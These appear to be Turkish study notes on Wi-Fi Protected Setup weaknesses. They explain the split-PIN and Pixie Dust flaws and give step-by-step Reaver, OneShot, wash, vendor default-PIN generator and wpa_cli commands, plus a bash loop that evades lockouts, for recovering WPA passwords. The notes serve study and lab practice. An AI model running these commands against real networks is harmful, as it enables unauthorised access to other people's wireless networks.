

# WPS (Wi-Fi Protected Setup) Özeti ve Zafiyetleri

WPS, kullanıcıların uzun ve karmaşık WPA/WPA2 parolalarını girmek zorunda kalmadan, bir tuşa basarak veya **8 haneli bir PIN** girerek ağa kolayca bağlanmasını sağlamak için 2006'da Cisco tarafından geliştirilmiş bir özelliktir.

Ancak bu kullanım kolaylığı, çok ciddi güvenlik açıklarını beraberinde getirir. Çok güçlü bir WPA2 parolası kullanılsa bile, WPS aktifse saldırganlar PIN'i kırarak doğrudan **WPA/WPA2 parolasını (PSK)** ele geçirebilir.

---

## 1. Temel Kavramlar ve Roller
WPS iletişimi bir dizi **EAP (Extensible Authentication Protocol)** mesajı üzerinden gerçekleşir:
* **Enrollee (İstemci/Station):** Ağa bağlanmak isteyen cihaz.
* **Registrar (Kayıtçı/Access Point):** Ağa giriş yetkisi veren cihaz (genellikle modemin/router'ın kendisi).

---

## 2. WPS Bağlantı Yöntemleri

| Yöntem | Açıklama | Güvenlik Durumu |
| :--- | :--- | :--- |
| **Push Button (PBC)** | Modem ve cihaz üzerindeki fiziksel (veya yazılımsal) bir tuşa basılarak bağlantı kurulur. En yaygın yöntemdir. | **Fiziksel Risk:** Menzil içindeki yetkisiz biri modemin tuşuna basarak ağa sızabilir. |
| **PIN Entry** | Cihazın ürettiği veya modemin altında yazan **8 haneli PIN** kodu girilerek bağlantı sağlanır. | **Kritik Zafiyet:** Protokol PIN'i iki ayrı yarıda doğruladığı için kaba kuvvet (brute-force) saldırılarına karşı çok savunmasızdır. |
| **NFC (Yakın Alan)** | Cihazı modeme yaklaştırarak (okutarak) bağlantı kurulur. Nadir kullanılır. | Fiziksel yakınlık gerektirir. |
| **USB Flash Drive** | Ayarların bir USB bellek ile taşınmasıdır. Pratik olmadığı için artık kullanılmaz. | Düşük risk / Kullanılmıyor. |

---

## 3. Teknik Zafiyet Analizi (Neden Kırılıyor?)

WPS arka planda güvenli kabul edilen **HMAC-SHA-256** özetleme (hashing) fonksiyonunu kullanır. Ancak kriptografi güçlü olsa da protokolün çalışma mantığı hatalıdır:

1. **Bölünmüş PIN Doğrulaması:** 8 haneli PIN tek seferde kontrol edilmez. Erişim noktası (AP), PIN'in **ilk 4 hanesini** ve **son 4 hanesini** ayrı ayrı doğrular ve her yarı için ayrı hata mesajı döner. Bu durum kombinasyon sayısını 100 milyondan **11.000'e** düşürür (8. hane checksum'dır).
2. **Online PIN Kırma:** Modeme doğrudan binlerce PIN denemesi gönderilir. Saatler sürebilir (Ortalama 4-10 saat).
3. **Offline PIN Kırma (Pixie Dust):** İletişim sırasında kullanılan rastgele sayıların (nonce değerlerinin) tahmin edilebilir olması ve EAP mesajlarında sızdırılan bilgiler sayesinde, yakalanan paketler üzerinden **birkaç dakika içinde** çevrimdışı olarak PIN kırılabilir.

> **Savunma (Mitigation):** Ağ güvenliğini sağlamak için modem arayüzünden **WPS özelliği tamamen devre dışı bırakılmalıdır (Disable).**

## 4. WPS PIN Yapısı (Neden Sadece 11.000 İhtimal Var?)

WPS PIN kodu **8 hanelidir** ve iki ana bölümden (4 hane + 4 hane) oluşur. Normalde 8 haneli bir şifre için 100 milyon ($10^8$) ihtimal olması gerekirken, WPS'in tasarımsal hatası yüzünden kaba kuvvet (brute-force) ile denenmesi gereken sayı **11.000'e** düşer:

*   **İlk Yarı (1. - 4. Haneler):** M4 ve M5 mesajlarında kullanılır. 10.000 ($10^4$) olası kombinasyonu vardır.
*   **İkinci Yarı (5. - 8. Haneler):** M6 ve M7 mesajlarında kullanılır. Bu yarının son (8.) hanesi sadece bir **checksum (sağlama toplamı)** basamağıdır ve ilk 7 haneye göre kolayca hesaplanır. Bu nedenle geriye sadece 1.000 ($10^3$) olası kombinasyon kalır.
*   Modem bu iki parçayı tek seferde değil, **ayrı ayrı** doğruladığı için saldırganın maksimum deneme sayısı: 10.000 + 1.000 = **11.000 toplam kombinasyondur**.

---

## 5. WPS EAP Mesajlaşma Süreci (Nasıl Çalışır?)

WPS işlemi, Access Point (AP/Enrollee) ve İstemci (Station/Registrar) arasında gerçekleşen bir dizi **EAP (Extensible Authentication Protocol)** mesajı ile sağlanır.

### WPS Kriptografik Terimler Sözlüğü (Tam Liste)

| Terim | Açıklama |
| :--- | :--- |
| **PKe** | Enrollee'nin (AP/Modem) Diffie-Hellman açık anahtarı (Public Key). *M1 mesajında gönderilir.* |
| **PKr** | Registrar'ın (İstemci/Client) Diffie-Hellman açık anahtarı. *M2 mesajında gönderilir.* |
| **PSK1** | 8 haneli PIN kodunun **ilk 4 hanesi** (10.000 olası kombinasyon). |
| **PSK2** | 8 haneli PIN kodunun **son 4 hanesi** (Son hane checksum olduğu için 1.000 olası kombinasyon). |
| **KDK (Key Derivation Key)** | Auth Key'i (Doğrulama Anahtarı) türetmek için kullanılan anahtar. |
| **KWK (Key Wrap Key)** | Mesajları AES ile şifrelemek için kullanılan anahtar. |
| **Auth Key** | `KDK`, `PSK1` ve `PSK2` değerlerinden türetilen doğrulama anahtarı. Hash'leri oluştururken kullanılır. |
| **E-S1 & E-S2** | Enrollee (AP) tarafından üretilen 128-bitlik gizli rastgele sayılar (Nonce). `E-Hash1` ve `E-Hash2` üretiminde kullanılır. |
| **R-S1 & R-S2** | Registrar (İstemci) tarafından üretilen 128-bitlik gizli rastgele sayılar (Nonce). `R-Hash1` ve `R-Hash2` üretiminde kullanılır. |
| **E-Hash1 & E-Hash2** | AP'nin PIN'in ilk ve ikinci yarısını kanıtlamak için `HMAC-SHA-256` (Auth Key kullanarak) ile ürettiği özetler. İçinde sırasıyla `E-S1/E-S2`, `PSK1/PSK2`, `PKe` ve `PKr` bulunur. *M3 mesajında gönderilir.* |
| **R-Hash1 & R-Hash2** | İstemcinin PIN'in ilk ve ikinci yarısını kanıtlamak için ürettiği özetler. İçinde `R-S1/R-S2`, `PSK1/PSK2`, `PKe` ve `PKr` bulunur. *M4 mesajında gönderilir.* |
| **WPA-PSK** | PIN doğrulaması başarılı olduğunda **M7 mesajında** (AES ile şifrelenmiş olarak) istemciye teslim edilen **asıl Wi-Fi parolası**. |

> **Küçük Not (Rol Değişimi):** Normalde AP "Registrar", İstemci "Enrollee" olur. Ancak WPS bir erişim noktasını (AP) sıfırdan yapılandırmak için kullanılıyorsa roller değişir: AP **Enrollee**, istemci cihaz ise AP'yi yapılandıran **Registrar** rolüne geçer.

### EAP Mesaj Trafiği Adımları
Ağ üzerindeki iletişim trafiği ("image_cabb40.png" referans alınarak) şu adımlarla ilerler:

1.  **Başlangıç:** İstemci süreci `EAPOL-Start` mesajı ile başlatır. AP kimlik bilgisi talep eder (`EAP Request Identify`) ve istemci yanıtlar (`EAP Response Identity`).
2.  **M1 ve M2 Mesajları:** Taraflar Diffie-Hellman açık anahtarlarını (PKe ve PKr) karşılıklı olarak iletirler (`EAP Request M1` ve `EAP Response M2`).
3.  **M3 Mesajı:** AP, E-Hash1 ve E-Hash2 değerlerini gönderir (`EAP Request M3`).
4.  **M4 ve M5 Mesajları:** İstemci şifreli R-Hash değerlerini ve R-S1 nonce değerini (`EAP Response M4`), AP ise E-S1 nonce değerini gönderir (`EAP Request M5`).
5.  **M6 ve M7 Mesajları:** İstemci R-S2 nonce değerini yollar (`EAP Response M6`). Eğer girilen PIN doğruysa, AP `EAP Request M7 + Creds` mesajında **asıl Wi-Fi şifresini (WPA-PSK)** şifreli olarak istemciye teslim eder.
6.  **M8 ve Sonuç:** İstemci şifreyi aldığını doğrular (`EAP Response M8 + Creds`). Süreç `EAP NACK` veya `EAP Acknowledgement` ile sonlanarak normal WPA el sıkışma evresine geçilir.

## 6. WPS Keşif ve Tarama (Reconnaissance)

Bir ağa WPS saldırısı düzenlemeden önce hedef Access Point'in (AP) **MAC adresini (BSSID)**, **WPS sürümünü**, **aktif modunu** ve **kilit (lock) durumunu** tespit etmemiz gerekir. 

*   **WPS Sürümü Neden Önemli?** Eğer hedef **WPS 2.0** kullanıyorsa, birkaç hatalı denemeden sonra kendini kilitleme (AP Rate Limiting / Lock) özelliğine sahiptir. Bu durumda standart Online Brute-Force yapmak çok zordur; yalnızca *Pixie Dust (Offline)*, *Null PIN* veya çok uzun bekleme süreli saldırılar denenebilir. **WPS 1.0** ise kilitlenme mekanizması olmadığı/zayıf olduğu için brute-force saldırılarına çok daha açıktır.
*   **MAC Adresi (Vendor) Neden Önemli?** MAC adresinin ilk 6 hanesinden (OUI) cihazın üreticisini (Vendor) bulabiliriz. Bazı üreticiler PIN kodlarını MAC adresine bağlı sabit algoritmalarla üretir.

> **Önemli:** Tüm komutlar `root` yetkisiyle çalıştırılmalıdır (`sudo -s`).

---

### Hazırlık: Kartı Monitör Moda Alma
```bash
iwconfig
airmon-ng start wlan0
```

---

### Yöntem 1: Airodump-ng ile WPS Taraması
Airodump-ng aracına `--wps` parametresi ekleyerek çevredeki ağların WPS bilgilerini görebiliriz. (`--ignore-negative-one` parametresi `-1 PWR` hata mesajlarını gizlemek için kullanılır).

**Genel Tarama:**
```bash
airodump-ng --wps --ignore-negative-one wlan0mon
```

**Spesifik Bir Hedefi Tarama (Kanal ve BSSID belirterek):**
```bash
airodump-ng --wps --ignore-negative-one -c 8 --bssid 60:38:E0:XX:XX:XX wlan0mon
```

#### Airodump-ng WPS Mod Kısaltmaları
Tarama çıktısındaki `WPS` sütununda yer alan ifadelerin anlamları:

| Kısaltma | Açıklama |
| :--- | :--- |
| **DISP** | PIN kodu, modemin yönetim panelinde (web arayüzünde) üretilir ve gösterilir. |
| **LAB** | PIN kodu, modemin üzerindeki fiziksel etikette (Label) yazılıdır. |
| **PBC** | Push Button Configuration. Fiziksel veya yazılımsal tuşa basılarak bağlantı kurulur. *(Sadece PBC açıksa PIN kırma saldırısı yapılamaz).* |
| **KPAD** | Keypad. PIN kodu istemci cihazdaki bir tuş takımından girilir. |
| **Locked** | WPS kilitlenmiş durumdadır (Çok fazla hatalı PIN denemesi yapılmış). |
| **USB** | Yapılandırma verileri USB bellek üzerinden aktarılır. |
| **ETHER** | Kurulumun Ethernet üzerinden yapılmasını sağlayan nadir bir mod. |
| **EXTNFC / INTNFC / NFCINTF** | NFC (Yakın Alan İletişimi) kullanılarak yapılan WPS kurulum modları. |

---

### Yöntem 2: Wash ile WPS Taraması
`wash`, özellikle WPS açık olan ağları tespit etmek için kullanılan çok pratik bir araçtır. Ağın kanalını, sinyal gücünü, WPS sürümünü, kilit durumunu (`Lck`) ve üreticisini (`Vendor`) doğrudan listeler.

**Standart Tarama:**
```bash
wash -i wlan0mon
```

**Detaylı (JSON) Tarama:**
```bash
wash -j -i wlan0mon
```
*Not: JSON çıktısında `"wps_locked" : 2` görünüyorsa, bu WPS'in **kilitli olmadığı (açık olduğu)** anlamına gelir.*

---

### MAC Adresinden Üretici (Vendor) Bulma
Eğer `wash` çıktısında üretici görünmüyorsa veya manuel sorgulamak istersen, MAC adresinin ilk 3 oktetini (OUI) IEEE veritabanında aratabilirsin:

```bash
grep -i "84-1B-5E" /var/lib/ieee-data/oui.txt
```
*(Örnek Çıktı: `84-1B-5E (hex) NETGEAR`)*

---

### Saldırı Öncesi Kontrol Listesi (Özet)
Bir WPS ağına saldırmadan önce şu 4 kritere dikkat edilmelidir:
1.  **WPS Sürümü:** 1.0 mı yoksa 2.0 mı?
2.  **Kilit Durumu (`wps_locked`):** `No` (veya JSON'da `2`) olmalı. Kilitliyse yeni istemci kabul etmez.
3.  **WPS Modu:** Sadece `PBC` (Buton) modundaysa PIN saldırısı işe yaramaz. `LAB`, `DISP` veya `KPAD` gibi PIN destekli modlar olmalı.
4.  **Maksimum PIN Deneme Kilidi:** Modem birkaç yanlış denemeden sonra kilitleniyorsa 11.000 kombinasyonu denemek mümkün olmayacaktır.

## 7. Online PIN Brute-Forcing (Çevrim İçi Kaba Kuvvet Saldırısı)

Online brute-forcing, hedef ağın WPS PIN kodunu bulmak için 11.000 olası kombinasyonun tek tek ve sırayla modeme gönderilerek denenmesi yöntemidir. Bu saldırı popüler olarak **Reaver** veya **Bully** gibi araçlarla gerçekleştirilir.

### Çalışma Mantığı ve Süreç
* Saldırı sırasında EAP mesajlaşma döngüsü her bir PIN denemesi için yeniden işletilir.
* M4 mesajında istemci; `R-Hash1`, `R-Hash2` değerlerini ve AES ile şifrelenmiş `R-S1` nonce değerini modeme gönderir.
* Erişim noktası (AP), gelen `R-Hash` değerlerini hesaplayarak gönderdiğimiz PIN'in doğru olup olmadığını doğrular. Eğer PIN doğruysa geriye kalan mesajlaşma adımları tamamlanır; yanlışsa `NACK` yanıtı alınır.

### Saldırı Sırasında Bilinenler ve Bilinmeyenler

| Durum | Açıklama |
| :--- | :--- |
| **Bildiğimiz Değerler** | • **PKe** (AP'nin açık anahtarı)<br>• Kendi ürettiğimiz **PKr** (İstemci açık anahtarı)<br>• Kendi ürettiğimiz **R-S1** ve **R-S2** nonce değerleri<br>• AP'den M3 mesajında aldığımız **E-Hash1** ve **E-Hash2** değerleri |
| **Bilmediğimiz Değerler** | • Gerçek PIN (`PSK1` ve `PSK2` - 11.000 ihtimalle tahmin edilir)<br>• **E-S1** ve **E-S2** nonce değerleri (PIN doğru tahmin edilirse M5 ve M7 mesajlarında alınır)<br>• Asıl Wi-Fi şifresi (**WPA-PSK** - M7 mesajında elde edilir) |

> **Not:** AP'nin ürettiği 128-bitlik gizli nonce değerleri (`E-S1` ve `E-S2`) rastgele olduğu sürece PIN'i tek tek denemek mecburidir. Ancak bazı üreticiler (vendors) bu değerleri zayıf veya tahmin edilebilir ürettiği için, online brute-force yerine doğrudan **Offline Pixie Dust** saldırısı tercih edilerek süreç saniyeler içinde çözülebilir.

## 8. Reaver ile Online PIN Brute-Forcing ve Alternatif Saldırılar

Reaver, WPS PIN kodlarını kaba kuvvet (brute-force) yöntemiyle kırmaya yarayan gelişmiş bir araçtır. `airmon-ng` aracı yerine `iw` komutuyla monitor moda geçiş yapmak Reaver'ın kararlı çalışması açısından önerilir.

---

### Adım 1: Monitor Mod Arayüzü Oluşturma
Reaver'ın düzgün çalışabilmesi için `iw` komutu ile yeni bir monitor arayüzü (`mon0`) oluşturulmalıdır:

```bash
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

Arayüzün durumunu doğrulamak için `iwconfig` kullanılabilir:
```bash
iwconfig
```

---

### Adım 2: Reaver Kullanım Parametreleri

| Parametre | Açıklama |
| :--- | :--- |
| `-i` | Kullanılacak monitor mod arayüzünün adı (örn: `mon0`) |
| `-b` | Hedef Access Point'in BSSID (MAC) adresi |
| `-c` | Kablosuz ağın kanal (channel) numarası |
| `-p` | Belirli bir PIN kodunu test etmek veya yarı bilinen PIN'in ilk kısmını vermek için kullanılır |
| `-d` | Denemeler arasındaki gecikme süresi (delay) |
| `-l` | AP WPS'i kilitlediğinde (lock) beklenecek süre |
| `-L` | Hedef AP tarafından bildirilen kilitli durumu (locked state) yoksayar |

---

### Adım 3: Reaver ile Saldırı Senaryoları

#### 1. Tam Kaba Kuvvet (Full Brute-Forcing)
Eğer elinizde hiçbir ön bilgi yoksa, Reaver 11.000 olası PIN kombinasyonunu sırasıyla denemeye başlar:
```bash
reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1
```

#### 2. Yarı Bilinen PIN ile Saldırı (Half-Known PIN)
PIN kodunun ilk 4 hanesi biliniyorsa (`-p` parametresiyle), Reaver sadece kalan 4 haneyi denetleyerek süreci çok daha hızlı tamamlar:
```bash
reaver -i mon0 -b B2:A5:1D:E1:B2:11 -c 1 -p 1234
```

#### 3. Null PIN Saldırısı
Bazı zafiyetli erişim noktaları, hiç PIN gönderilmediğinde veya boş bir PIN (`-p ""` ya da `-p " "`) gönderildiğinde doğrudan WPA-PSK anahtarını açık edebilir:
```bash
reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "
```

#### 4. Bilinen PIN ile Şifreyi Doğrulama / Çekme
Eğer PIN daha önceden biliniyorsa (örneğin router'ın arkasındaki etiketten / Label modundan öğrenildiyse), WPA-PSK anahtarını hızlıca elde etmek için doğrudan şu komut çalıştırılır:
```bash
sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p 88766197
```


## 9. Korumalı Erişim Noktaları (Secured Access Points) ve Rate Limiting

Günümüzdeki modern modemler ve üreticiler, geleneksel online brute-force saldırılarına karşı akıllı savunma mekanizmaları geliştirmiştir. Bu tedbirlerin başında WPS kilitleme (locking) ve hız sınırlama (rate limiting) özellikleri gelir.

### Modern AP'lerin Kilitleme Davranışları
*   **3 Hatalı Deneme:** Birçok yeni nesil üretici, art arda yapılan 3 hatalı PIN denemesinden sonra AP'yi **60 saniyeliğine** kilitler.
*   **10 Hatalı Deneme:** Hatalı denemeler devam edip 10 sınıra ulaşıldığında ise bazı modemler sistemi **365 gün (1 yıl)** boyunca kilitleyerek tüm kaba kuvvet denemelerini tamamen engeller.

### Airodump-ng Çıktısında Kilit Durumu (Locked State)
Tarama yaparken ağın `WPS` sütununda `Locked` ibaresini görmek, AP'nin güvenlik mekanizmasını tetiklediğini gösterir:

```text
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                ESSID
86:53:10:C3:1B:26  -28   0      483       33    0   1   54   WPA2 CCMP   PSK Locked              HackMe  
```

---

### Reaver Gelişmiş Parametreleri ve Optimizasyon
Eğer üretici çok katı bir kilit mekanizması uygulamadıysa, Reaver'ı ek parametrelerle ince ayarlardan geçirerek süreci optimize edebiliriz:

| Parametre | Açıklama |
| :--- | :--- |
| `-L`, `--ignore-locks` | Hedef AP tarafından bildirilen kilitli durumu (Locked state) yoksayar. |
| `-N`, `--no-nacks` | Sırasız (out of order) paketler alındığında NACK mesajları göndermez. |
| `-d`, `--delay=<saniye>` | PIN denemeleri arasına gecikme ekler (1 saniye vb.). |
| `-T`, `--m57-timeout=<saniye>` | M5/M7 zaman aşımı süresini belirler (örn: 0.40). |
| `-r`, `--recurring-delay=<x:y>` | Belirli sayıda (`x`) PIN denemesinden sonra `y` saniye uyku/bekleme modu uygular. |

> **İpucu:** Eğer AP ilk 3 denemeden sonra sürekli kilitleniyorsa, tüm 11.000 kombinasyonu denemek imkansız hale gelebilir. Bu senaryolarda şansımız yaver gitmez ve ilk 10 denemede doğru PIN'e ulaşamazsak, rastgele denemek yerine üreticiye özel **özel PIN üretim algoritmaları (Custom Wordlist / Pin Generation)** kullanmak gerekir.


# WPSPin ile Özel PIN Listesi Oluşturma ve Brute-Force

**WPSPin**, hedefin BSSID adresini kullanarak üreticilerin varsayılan algoritmalarına dayalı muhtemel WPS PIN'lerini üreten bir araçtır. Tüm kombinasyonları denemek yerine sadece hedefin BSSID'sine uygun, yüksek ihtimalli PIN'leri test etmeyi sağlar.

## Kurulum
```bash
git clone [https://github.com/epicdev420/WPSPin.git](https://github.com/epicdev420/WPSPin.git)
cd wpspin
sudo python setup.py install
```

## Temel Kullanım ve PIN Filtreleme
Belirli bir BSSID için tüm olası PIN'leri üretmek:
```bash
wpspin -A 60:38:E0:A2:3D:2A
```

Bash script içerisinde kullanabilmek amacıyla, çıktıdaki sadece 8 haneli PIN'leri ayıklayıp tek satıra (`PINS` değişkeni için) dönüştürmek:
```bash
wpspin -A 60:38:E0:A2:3D:2A | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
```

## Reaver ile Otomatize Bash Script
Elde edilen potansiyel PIN'leri Reaver ile tek tek (ve kilitlenmeyi önleyecek gecikmelerle) denemek için aşağıdaki betik kullanılır:

```bash
#!/bin/bash

# wpspin çıktısından elde edilen PIN'leri buraya yapıştırın
PINS='73834410 94229882 06490959 11184812 63311501 36499373'

for PIN in $PINS
do
    echo "Attempting PIN: $PIN"
    # --max-attempts=1 : Verilen PIN sadece 1 kez denenir.
    # -l 100 : AP kilitlenirse (lock) 100 saniye bekler.
    # -r 3:45 : Her 3 denemeden sonra 45 saniye duraklar.
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN
done
echo "PIN Guesses Complete"
```
*Çalıştırmak için:* `sudo bash pinguess.sh`

## Vendor (Üretici) Tespiti
Eğer AP kilitleniyorsa veya PIN listesini daha spesifik hale getirmek istiyorsanız, MAC adresinin ilk 3 oktetini (OUI) aratarak hedefin üreticisini tespit edebilirsiniz:
```bash
grep -i "60-38-E0" /var/lib/ieee-data/oui.txt
```


# WPS PIN Üretme Araçları

Online kaba kuvvet (brute-force) saldırılarında 11.000 olası PIN'in tamamını denemek yerine, cihazların varsayılan PIN üretme algoritmalarından faydalanarak deneme sayısını düşüren çeşitli araçlar kullanılır.

## 1. Vodafone EasyBox (Default-wps-pin)
Arcadyan Networks tarafından üretilen ve Vodafone Almanya için yeniden markalanan DSL yönlendiricilerindeki bir zafiyeti kullanır. Varsayılan WPS PIN'i, cihazın MAC adresi (BSSID) ve seri numarasına dayalı bir algoritma ile hesaplanır.

**Kurulum:**
```bash
git clone [https://github.com/eye9poob/Default-wps-pin](https://github.com/eye9poob/Default-wps-pin)
```

**Kullanım:**
Hedefin BSSID adresi parametre olarak verilir.
```bash
python2 /opt/Default-wps-pin/default-wps-pin.py 60:38:E0:D4:A2:5E
```
*Çıktı Örneği:* Türetilmiş seri numarası, SSID ve olası WPS PIN değerini (ör. `27038895`) ekrana basar.

## 2. WPS-PIN Scripti
BSSID üzerinden varsayılan PIN'leri üreten etkileşimli bir bash betiğidir.

**Kullanım:**
```bash
/opt/WPSPIN.sh
```
Araç arayüzü açıldığında sırasıyla şu adımlar izlenir:
1. Dil seçimi yapılır (ör. `1` - English).
2. Ana menüden `1 - GENERATE PIN` seçeneği girilir.
3. Hedefin eSSID (Ağ adı) ve bSSID (MAC adresi) bilgileri istenir.
4. Araç, hedefe yönelik olası PIN'i (ör. `76142673`) hesaplayıp döndürür.

## 3. Naranja MekaniK (nmk)
Özellikle Arcadyan (Livebox 2.1 ve Livebox Next) cihazları için varsayılan PIN üretir. İşlem için hedefin 2.4GHz ağından BSSID'nin **son 4 hanesi** ve router arkasındaki etikette bulunan seri numarasının **son 4 hanesi** gereklidir.

**Desteklenen Modeller:**
* Arcadyan ARV7519RW22 (Livebox 2.1)
* Arcadyan ARV7520CW22 (Livebox 2.1)
* Arcadyan VRV9510KWAC23 (Livebox Next)

**Kullanım:**
```bash
# Format: python2 orangen.py [BSSID_Son_4_Hane] [Seri_No_Son_4_Hane]
python2 /opt/nmk/orangen.py A2BD 7281
```
*Çıktı Örneği:* Hesaplanan PIN'i (ör. `99559236`) doğrudan terminale yazdırır.

# Pixie Dust Saldırısı (Pixie Dust Attack)

Pixie Dust saldırısı, Ralink, Realtek, MediaTek ve Broadcom gibi üreticilerin yongasetlerinde (chipset) bulunan "kötü rastgele sayı üretimi" (bad randomization / nonce generation) zafiyetini kullanarak WPS PIN'ini **çevrimdışı (offline)** olarak kırmaya yarayan bir yöntemdir.

Geleneksel kaba kuvvet (online brute-force) saldırılarında 11.000 olası PIN kombinasyonunun Access Point (AP) üzerinde tek tek denenmesi gerekir ve bu işlem saatler sürebilir. Ayrıca çok fazla deneme yapıldığı için cihaz kendini kilitleyebilir. Pixie Dust ise gerekli verileri ağdan sadece birkaç paket göndererek çektikten sonra kırma işlemini saldırganın kendi bilgisayarında saniyeler içinde çözer.

## Zafiyetin Temel Nedeni

WPS mesajlaşma adımlarında (M1, M2, M3) bazı anahtarlar ve hash değerleri değiş tokuş edilir:
* **PKe ve PKr:** İstemci (Enrollee) ve AP (Registrar) arasında açıkça paylaşılan bilinen anahtarlardır.
* **E-S1 ve E-S2 (Nonce Değerleri):** Cihazın ürettiği 128 bitlik rastgele sayılardır.
* **PSK1 ve PSK2:** WPS PIN'inin ikiye bölünmüş halidir (Kırılmak istenen asıl hedef değerler).

Hedeflenen Hash yapıları şöyledir:
* `E-Hash1 = (E-S1 | PSK1 | PKe | PKr)`
* `E-Hash2 = (E-S2 | PSK2 | PKe | PKr)`

`PKe` ve `PKr` halihazırda bilindiğinden, eğer cihazın ürettiği rastgele `E-S1` ve `E-S2` değerleri **tahmin edilebilirse**, geriye sadece PIN'in yarıları olan `PSK1` ve `PSK2`'yi brute-force ile bulmak kalır. Çevrimdışı yapıldığı için bu işlem anında biter.

## Üreticilere Göre Zafiyet Türleri

### 1. Ralink ve MediaTek
Bu yongasetlerinde "Sıfır Nonce" (Zero Nonce) hatası bulunur. Cihaz hiçbir şekilde rastgele sayı üretmez, `E-S1` ve `E-S2` değerleri her zaman **sıfır (0)** olarak ayarlanır.
* `E-Hash1 = ( 0 | PSK1 | Biliniyor | Biliniyor )`
* Saldırgan sadece PSK (PIN) kısmını arar.

### 2. Broadcom
Bu yongasetleri, `E-S1`, `E-S2`, `PKe` ve `N1` (enrollee nonce) değerlerini üretmek için **aynı rastgele sayı üretim algoritmasını ve çekirdeğini (seed)** kullanır.
* Saldırgan, bilinen `PKe` veya `N1` değerini üreten seed değerini bulana kadar çevrimdışı deneme yapar.
* Doğru seed bulunduğunda, aynı formülle `E-S1` ve `E-S2` değerleri de kesin olarak ortaya çıkar.

### 3. Realtek
Rastgele sayı üretmek için "seed" değeri olarak **Unix zaman damgalarını (timestamp)** kullanır.
* Zaman tabanlı çalıştığı için `E-S1`, `E-S2` ve `PKe` değerleri genellikle birbirinin aynısıdır veya aralarında çok küçük, tahmin edilebilir bir zaman farkı (N) vardır (`E-S1 = E-S2 = PKe + N`).
* Bilinen `PKe` değerini oluşturan zaman damgası tahmin edilerek (üzerine/altına ufak eklemeler yapılarak) `E-S1` ve `E-S2` değerlerine kolayca ulaşılır.

## Pixie Dust Saldırısının Avantajları
* **Hız:** 11.000 kombinasyonu AP'ye online olarak sormak yerine, kendi bilgisayarınızda nonce değerlerini tahmin ettiğiniz için işlem saniyeler sürer.
* **Kilitlenmeyi Önleme (AP Locking):** AP'ye gönderilen istek sayısı çok az olduğu için cihazın "WPS Locked" moduna geçmesi (kendini kilitlemesi) önlenir.


# Pixie Dust Saldırısı (Offline WPS Kırma)

Pixie Dust saldırısı, WPS PIN doğrulama sürecindeki zafiyetleri (kötü rastgele sayı üretimi vb.) sömürerek WPA/WPA2 ön paylaşımlı anahtarını (PSK - Wi-Fi Şifresi) hızlıca elde etmeye yarayan popüler bir yöntemdir. Bu saldırı için temel olarak **Reaver** ve **OneShot** araçları kullanılır.

## 1. Reaver ile Pixie Dust Saldırısı

**Arayüzü Monitör Moda Alma:**
```bash
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

**WPS Destekli Ağları Tarama:**
```bash
airodump-ng mon0 --wps
```

**Pixie Dust Saldırısını Başlatma:**
Tarama sonucunda bulunan hedefin BSSID ve Kanal (CH) bilgisiyle, `-K 1` (Pixie Dust) parametresi kullanılarak saldırı başlatılır.
```bash
reaver -K 1 -vvv -b 86:FC:9F:5D:67:4E -c 1 -i mon0
```

**Bulunan PIN ile WPA-PSK (Parola) Elde Etme:**
Saldırı başarılı olup PIN değerini (örneğin `32552273`) verdiğinde, bu PIN kullanılarak ağın asıl Wi-Fi şifresi çekilir.
```bash
reaver -b 86:FC:9F:5D:67:4E -c 1 -p 32552273 -i mon0
```

---

## 2. OneShot ile Pixie Dust Saldırısı

OneShot kullanırken, standart `airmon-ng` yapısına uymak için daha önceden oluşturulmuş manuel `mon0` arayüzü silinir ve yeniden monitör mod başlatılır.

**Arayüz Hazırlığı:**
```bash
iw dev mon0 del
airmon-ng start wlan0
```

**OneShot Saldırısını Başlatma:**
`-K` parametresi OneShot aracında da Pixie Dust saldırısını tetiklemek için kullanılır.
```bash
python3 /opt/OneShot/oneshot.py -b 86:FC:9F:5D:67:4E -i wlan0mon -K
```
*(Araç zafiyeti sömürdüğünde, saniyeler içinde PIN değerini ekrana basacaktır.)*



# Push Button Configuration (PBC) Saldırısı

**Push Button Configuration (PBC)**, kullanıcıların karmaşık şifreler girmeden cihazlarını WPS üzerinden Wi-Fi ağına bağlamasını sağlayan bir yöntemdir. Bağlantı, yönlendirici (router) ve bağlanacak cihaz üzerindeki fiziksel bir düğmeye basılarak gerçekleştirilir.

## Nasıl Çalışır?
*   **Fiziksel Butona Basma:** Çoğu AP/Router üzerinde PBC'yi tetikleyen bir WPS butonu bulunur.
*   **Otomatik Eşleşme:** Butona basıldıktan sonra yönlendirici belirli bir süre (genellikle 2 dakika) yeni cihaz isteklerini dinler. Bu sürede şifre sorulmaz.
*   **Cihaz Etkileşimi:** İstemci cihaz (telefon, bilgisayar vb.) WPS ile bağlanma seçeneğini kullanarak PBC modundaki yönlendiriciyi bulur ve şifresiz eşleşir.

---

## 1. Keşif (Enumeration)
Ağın Push Button Configuration (PBC) modunda olup olmadığını kontrol etmek için `airodump-ng` kullanılır.

```bash
airodump-ng wlan0mon -c 1 --wps
```
*Çıktıdaki `WPS` sütununda `LAB,DISP,PBC,KPAD` gibi değerler görülür. `PBC` ibaresi, ağın bu saldırıya açık olduğunu gösterir.*

---

## 2. Saldırıyı Gerçekleştirme
Fiziksel erişiminiz olduğunda (veya laboratuvar ortamında AP sürekli butona basılmış gibi davranıyorsa) parolayı manuel veya otomatik araçlarla atlayabilirsiniz.

### Yöntem A: wpa_cli ile Manuel Bağlantı

**Adım 1: Hedef BSSID'yi Bulma**
Etraftaki ağları tarayarak hedefin BSSID'sini alın:
```bash
iwlist wlan0 scan | grep 'Cell\|Quality\|ESSID\|IEEE'
# VEYA
wpa_cli scan_results
```

**Adım 2: PBC ile Bağlanma**
Hedef BSSID'yi bulduktan hemen sonra (router'daki butona basıldıktan sonraki 2 dakikalık pencerede) şu komutu çalıştırın:
```bash
wpa_cli wps_pbc D8:D6:3D:EB:29:D5
```

**Adım 3: Bağlantıyı Doğrulama**
